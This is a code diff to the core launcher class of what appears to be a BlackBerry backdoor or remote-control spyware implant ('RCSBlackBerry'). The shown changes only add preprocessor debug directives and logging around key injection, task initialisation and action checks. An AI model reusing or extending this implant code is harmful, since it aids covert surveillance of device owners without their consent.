@@ -19,7 +19,7 @@ import com.ht.rcs.blackberry.utils.Utils;
  */
 public class Core {
 
-    /** The debug. */
+    /** The debug instance. */
     private static Debug debug;
 
     /**
@@ -32,18 +32,31 @@ public class Core {
         Utils.sleep(5000);
 
         debug = new Debug("Core", DebugLevel.VERBOSE);
-        debug.init(true, false, true);
+
+        // #debug
+        debug.init(false, false, true);
+        // #debug debug
+         //#debug
         debug.trace("RCSBlackBerry launching");
 
+        boolean antennaInstalled = true;
+        // #if 1=0
+        // @ antennaInstalled = false;
+        // #endif
+        // #debug
+        debug.trace("Antenna: " + antennaInstalled);
+
         if (!Keys.hasBeenBinaryPatched()) {
+            // #debug warn
+            // #debug
             debug.warn("Not binary patched, injecting 323");
             InstanceKeys323.injectKeys323();
         }
 
-      
         Core core = new Core();
         boolean ret = core.run();
 
+        // #debug
         debug.trace("RCSBlackBerry exit, return " + ret);
     }
 
@@ -62,21 +75,28 @@ public class Core {
         Utils.sleep(5000);
 
         for (;;) {
+            // #debug
             debug.info("init task");
             if (taskObj.taskInit() == false) {
+                // #debug
                 debug.error("TaskInit() FAILED");
                 Msg.demo("Backdoor Init... FAILED");
                 Msg.show();
                 return false;
             } else {
+                // #debug debug
+                 //#debug
                 debug.trace("TaskInit() OK");
                 // CHECK: Status o init?
                 Msg.demo("Backdoor Init... OK");
                 Msg.show();
             }
 
+            // #debug info
+            // #debug
             debug.info("starting checking actions");
             if (taskObj.checkActions() == false) {
+                // #debug
                 debug.error("CheckActions() [Uninstalling?] FAILED");
                 // chiudere tutti i thread
                 // decidere se e' un uninstall
